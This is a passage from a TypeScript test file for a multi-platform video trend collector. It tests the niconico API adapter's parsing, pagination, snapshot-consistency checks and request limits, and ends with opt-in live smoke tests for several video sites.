    expect(ch.account).toMatchObject({ platformId: 'channel/2650159', name: 'niconico 채널 2650159', url: 'https://ch.nicovideo.jp/ch2650159' });
    expect(ch.counters).toEqual({ views: 272520, likes: 5390, comments: 60434, shares: null });
    expect(ch.discoveredVia).toBe('niconico:tag:アニメ');
  });

  it('decodes the HTML entities the API leaves in titles and tags', () => {
    const row = { ...fxJson('niconico-search-game.json').data[0], title: '#133【プラモデル解説】&quot;HG ヒュッケバイン&quot; ドラクエ1&amp;2', tags: 'ゲーム R&amp;B zebra&#32;coffee' };
    const v = niconicoToRawVideo(row, SNAPSHOT_AT, 'niconico:tag:ゲーム')!;
    expect(v.title).toBe('#133【プラモデル解説】"HG ヒュッケバイン" ドラクエ1&2');
    expect(v.tags).toEqual(['ゲーム', 'R&B', 'zebra coffee']);
    expect(niconicoTags(['a&amp;b', 'c'])).toEqual(['a&b', 'c']);
    expect(v.language).toBe('ja');
  });

  it('classifies short videos by lengthSeconds ≤ 60 and keeps missing counters null', async () => {
    const row = fxJson('niconico-search-game.json').data[0];
    const data = [
      { ...row, contentId: 'sm1', lengthSeconds: 45 },
      { ...row, contentId: 'sm2', lengthSeconds: 60 },
      { ...row, contentId: 'sm3', lengthSeconds: 61 },
      { ...row, contentId: 'sm4', lengthSeconds: null, likeCounter: null, commentCounter: undefined, genre: null },
      { ...row, contentId: 'sm5', userId: null, channelId: null }, // no account -> dropped
      { ...row, contentId: 'sm6', title: 'English only', description: 'no kana', tags: 'tag' },
    ];
    const http = new FakeHttp(
      nnRoutes({ extra: [{ name: 'rows', match: (u) => u.pathname.endsWith('/contents/search'), reply: () => ({ meta: { status: 200, totalCount: 6 }, data }) }] }),
    );
    const res = await niconico.collect(makeCtx(http, { seeds: { niconico: [{ ...NN_GAME, limit: 6 }] } }));
    expect(res.videos.map((v) => [v.platformId, v.format])).toEqual([
      ['sm1', 'short'],
      ['sm2', 'short'],
      ['sm3', 'long'],
      ['sm4', 'unknown'],
      ['sm6', 'long'],
    ]);
    const sm4 = byId(res.videos, 'sm4');
    expect(sm4.counters).toEqual({ views: 34739, likes: null, comments: null, shares: null });
    expect(sm4.sourceCategory).toBeNull();
    expect(byId(res.videos, 'sm6').language).toBeNull();
    expect(res.errors).toEqual([expect.stringContaining('1개 제외')]);
  });

  it('collects nothing when the snapshot time is unavailable', async () => {
    for (const version of [() => httpError(503, { meta: { status: 503, errorCode: 'MAINTENANCE' } }), () => ({}), () => ({ last_modified: 'nope' })]) {
      const http = new FakeHttp(nnRoutes({ version }));
      const res = await niconico.collect(makeCtx(http, { refreshIds: ['sm46833211'], seeds: { niconico: [NN_GAME] } }));
      expect(http.requestCount).toBe(1);
      expect(res.videos).toEqual([]);
      expect(res.errors).toHaveLength(1);
      expect(res.errors[0]).toContain('/snapshot/version');
    }
  });

  it('discards results if the snapshot changed during the run', async () => {
    const http = new FakeHttp(nnRoutes({ version: (n) => (n === 1 ? fxJson('niconico-version.json') : { last_modified: '2026-09-29T07:02:11+09:00' }) }));
    const res = await niconico.collect(makeCtx(http, { refreshIds: ['sm99999999999'], seeds: { niconico: [NN_GAME] } }));
    expect(res.videos).toEqual([]);
    expect(res.gone ?? []).toEqual([]);
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain('스냅샷이 갱신됨');
  });

  it('refreshes by contentId filters; ids missing from the snapshot become gone/unknown', async () => {
    const http = new FakeHttp(nnRoutes());
    const res = await niconico.collect(makeCtx(http, { refreshIds: ['sm46833211', 'so46803554', 'sm99999999999'] }));
    const refresh = http.urls()[1];
    expect(refresh.searchParams.get('q')).toBe('');
    expect(refresh.searchParams.get('targets')).toBe('title');
    expect(refresh.searchParams.get('_sort')).toBe('-viewCounter');
    expect(refresh.searchParams.get('_context')).toBe('VideoTrendIntel');
    expect([0, 1, 2].map((i) => refresh.searchParams.get(`filters[contentId][${i}]`))).toEqual(['sm46833211', 'so46803554', 'sm99999999999']);
    expect(Number(refresh.searchParams.get('_limit'))).toBeGreaterThanOrEqual(3);
    expect(res.videos.map((v) => v.platformId).sort()).toEqual(['sm46833211', 'so46803554']);
    for (const v of res.videos) {
      expect(v.discoveredVia).toBe('niconico:refresh');
      expect(v.observedAt).toBe(SNAPSHOT_AT);
    }
    expect(res.gone).toEqual([{ platformId: 'sm99999999999', status: 'unknown' }]);
    expect(res.errors).toEqual([]);
  });

  it('refresh batches ≤ 100 ids and skips ids seen in discovery', async () => {
    const ids = Array.from({ length: 150 }, (_, i) => `sm${1000 + i}`);
    const http = new FakeHttp(nnRoutes());
    await niconico.collect(makeCtx(http, { refreshIds: ['sm46833211', ...ids], seeds: { niconico: [NN_GAME] } }));
    const batches = http.urls().filter((u) => u.searchParams.has('filters[contentId][0]'));
    const sizes = batches.map((u) => [...u.searchParams.keys()].filter((k) => k.startsWith('filters[contentId]')).length);
    expect(sizes).toEqual([100, 50]);
    expect(batches.flatMap((u) => [...u.searchParams.values()]).includes('sm46833211')).toBe(false);
  });

  it('paginates with _offset/_limit ≤ 100', async () => {
    const row = fxJson('niconico-search-game.json').data[0];
    const http = new FakeHttp(
      nnRoutes({
        extra: [
          {
            name: 'pages',
            match: (u) => u.pathname.endsWith('/contents/search'),
            reply: (u) => {
              const off = Number(u.searchParams.get('_offset'));
              const lim = Number(u.searchParams.get('_limit'));
              return { meta: { status: 200, totalCount: 5000 }, data: Array.from({ length: lim }, (_, i) => ({ ...row, contentId: `sm${off + i}` })) };
            },
          },
        ],
      }),
    );
    const res = await niconico.collect(makeCtx(http, { seeds: { niconico: [{ ...NN_GAME, limit: 150 }] } }));
    const searches = http.urls().filter((u) => u.pathname.endsWith('/contents/search'));
    expect(searches.map((u) => [u.searchParams.get('_offset'), u.searchParams.get('_limit')])).toEqual([
      ['0', '100'],
      ['100', '50'],
    ]);
    expect(res.videos).toHaveLength(150);
  });

  it('reports API error JSON and continues with the next seed', async () => {
    const errBody = fxJson('niconico-error-400.json');
    const http = new FakeHttp(
      nnRoutes({ extra: [{ name: 'bad', match: (u) => u.searchParams.get('q') === 'bad', reply: () => httpError(400, errBody) }] }),
    );
    const res = await niconico.collect(makeCtx(http, { seeds: { niconico: [{ ...NN_GAME, q: 'bad' }, NN_GAME] } }));
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain('QUERY_PARSE_ERROR');
    expect(res.errors[0]).toContain('HTTP 400');
    expect(res.videos).toHaveLength(3);

    const inline = new FakeHttp(nnRoutes({ extra: [{ name: 'bad', match: (u) => u.pathname.endsWith('/contents/search'), reply: () => errBody }] }));
    const r2 = await niconico.collect(makeCtx(inline, { seeds: { niconico: [NN_GAME] } }));
    expect(r2.errors[0]).toContain('_sort is not valid');

    const fivehundred = new FakeHttp(
      nnRoutes({ extra: [{ name: 'down', match: (u) => u.searchParams.get('q') === 'down', reply: () => httpError(500, 'Internal Server Error') }] }),
    );
    const r3 = await niconico.collect(makeCtx(fivehundred, { seeds: { niconico: [{ ...NN_GAME, q: 'down' }, NN_ANIME] } }));
    expect(r3.errors).toHaveLength(1);
    expect(r3.videos).toHaveLength(2);
  });

  it('never exceeds maxRequests (version check included)', async () => {
    for (const max of [0, 1, 2, 3, 4]) {
      const http = new FakeHttp(nnRoutes());
      const res = await niconico.collect(
        makeCtx(http, { maxRequests: max, refreshIds: ['sm99999999999'], seeds: { niconico: [NN_GAME, NN_ANIME] } }),
      );
      expect(http.requestCount).toBeLessThanOrEqual(max);
      if (max < 4) expect(res.errors.some((e) => e.includes(`maxRequests=${max}`))).toBe(true);
      for (const v of res.videos) expect(v.observedAt).toBe(SNAPSHOT_AT);
    }
    // with room for everything: version + 2 searches + refresh + version = 5
    const http = new FakeHttp(nnRoutes());
    const res = await niconico.collect(makeCtx(http, { maxRequests: 5, refreshIds: ['sm99999999999'], seeds: { niconico: [NN_GAME, NN_ANIME] } }));
    expect(http.requestCount).toBe(5);
    expect(res.errors).toEqual([]);
  });
});

/* ================================================================== live smoke (opt-in) */

class LiveHttp implements HttpClient {
  requestCount = 0;
  private async fetch(url: string, headers?: Record<string, string>): Promise<Response> {
    this.requestCount++;
    const res = await fetch(url, { headers: { 'User-Agent': USER_AGENT, ...(headers ?? {}) }, signal: AbortSignal.timeout(20_000) });
    if (!res.ok) throw Object.assign(new Error(`HTTP ${res.status} ${url}`), { status: res.status, body: await res.text() });
    return res;
  }
  async getJson<T = unknown>(url: string, init?: { headers?: Record<string, string> }): Promise<T> {
    return (await (await this.fetch(url, init?.headers)).json()) as T;
  }
  async getText(url: string, init?: { headers?: Record<string, string> }): Promise<string> {
    return (await this.fetch(url, init?.headers)).text();
  }
}

describe.skipIf(!process.env.LIVE)('live smoke (LIVE=1)', () => {
  const live = (over: Parameters<typeof makeCtx>[1]) => makeCtx(new LiveHttp(), { now: Date.now(), maxRequests: 6, ...over });

  it('youtube-rss', async () => {
    const res = await youtubeRss.collect(live({ seeds: { youtubeChannels: [BLACKPINK] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos.length).toBeGreaterThan(0);
    expect(res.videos.length).toBeLessThanOrEqual(15);
    expect(res.videos[0].counters.views).toBeTypeOf('number');
  }, 60_000);

  it('dailymotion', async () => {
    const res = await dailymotion.collect(live({ refreshIds: ['x7tgad0'], seeds: { dailymotion: [{ ...DM_KR, limit: 3 }] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos.length).toBeGreaterThanOrEqual(3);
  }, 60_000);

  it('peertube', async () => {
    const res = await peertube.collect(live({ refreshIds: [`${ONAIR}@onair.sbs`], seeds: { peertube: [{ ...PT_KO, limit: 3 }] } }));
    expect(res.videos.length).toBeGreaterThan(0);
  }, 60_000);

  it('niconico', async () => {
    const res = await niconico.collect(live({ refreshIds: ['sm9'], seeds: { niconico: [NN_GAME] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos.length).toBeGreaterThan(0);
    const snap = res.videos[0].observedAt;
    expect(snap).toBeLessThan(Date.now());
    expect(Date.now() - snap).toBeLessThan(3 * 86_400_000);
    expect(res.videos.some((v) => v.platformId === 'sm9')).toBe(true);
  }, 60_000);
});
